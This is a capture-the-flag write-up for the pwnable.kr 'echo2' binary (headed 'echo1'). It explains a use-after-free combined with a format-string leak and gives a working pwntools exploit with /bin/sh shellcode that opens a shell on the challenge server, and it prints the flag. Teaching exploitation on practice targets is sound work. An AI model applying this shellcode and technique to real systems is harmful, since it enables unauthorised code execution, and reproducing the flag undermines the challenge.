# echo1

## Description

echo2 - 50 pt

> Pwn this echo service. <br><br>
> download : http://pwnable.kr/bin/echo2 <br><br>
> Running at : nc pwnable.kr 9011


## Solution

### Understanding the binary

Just like in `echo1`, again we are given a 64 bit ELF executable, with no security features enabled.

Let's take a look at the decompiled code in IDA:

**main:**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rax
  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
  _QWORD v6[4]; // [rsp+10h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ");
  __isoc99_scanf("%24s", v6);
  v3 = o;
  *(_QWORD *)o = v6[0];
  v3[1] = v6[1];
  v3[2] = v6[2];
  id = v6[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  for ( i = 0; i != 121; i = getchar() )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        __isoc99_scanf("%d", &i);
        getchar();
        if ( i > 3 )
          break;
        ((void (*)(void))func[i - 1])();
      }
      if ( i == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)");
  }
  puts("bye");
  return 0;
}
```

**echo1:**
```c
int echo1()
{
  return puts("not supported");
}
```

**echo2:**
```c
__int64 echo2()
{
  char format[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(format, 32LL);
  printf(format);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

**echo3:**
```c
__int64 echo3()
{
  char *s; // [rsp+8h] [rbp-8h]

  (*((void (__fastcall **)(void *))o + 3))(o);
  s = (char *)malloc(0x20uLL);
  get_input(s, 32LL);
  puts(s);
  free(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

**cleanup:**
```c
void cleanup()
{
  free(o);
}
```

Again, byebye and greetings are simply printing strings, and get_input is a wrapper for fgets. Basically, this program is almost the same as `echo1`, but this time the first echo function is not supported and the other two are.

### Exploit

When the `4`th option is pressed - for exiting the program - the `cleanup` function is called, which frees the memory allocated for the `o` object. However, if we choose then press `n` (for not sure) then we get a use after free vulnerability, because the `o` object is used in `echo2` to call the `greetings` function. 

So, if we can somehow allocate memory using `malloc`, with an appropriate size, and then write there - we'll be able to overwrite the `greetings` function pointer, and call it to get a shell.

There are two main challenges:

 * We need to save shellcode that calls `/bin/sh` somewhere in the memory - and leak that addres

 * We need to perform the malloc and overwrite the `greetings` function pointer.

The second challenge is pretty easy, because we can simply use the `UAF echo` option to allocate memory and write there.

For the first challenge - we can simply place the shellcode at beggining of the program, when we are asked for our name - and then leak the address using `FSB echo`.

### Exploit code

```python
from pwn import *

elf = context.binary = ELF('./echo2')
conn = remote('pwnable.kr', 9011)

# ---------- give shellcode as name ---------- #

payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e' + \
          b'\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
conn.sendline(payload)

# ---------- leak address of name ---------- #

payload = b'2\n' # 'FSB echo'
payload += b'%10$p' # leak address
conn.sendline(payload)

name_addr = int(conn.recvline_startswith(b'0x').strip(), 16) - 0x20 # add offset to leak

# ---------- use after free ---------- #

payload = b'4\n' # 'exit'
payload += b'n\n' # 'no'
payload += b'3\n' # 'UAF echo'
payload += b'A' * 8 * 3 # padding
payload += p64(name_addr) # overwrite 'greetings'
conn.sendline(payload)

# ---------- get shell ---------- #

conn.send(b'2\n')
conn.interactive()
```

```
fun_with_UAF_and_FSB :)
```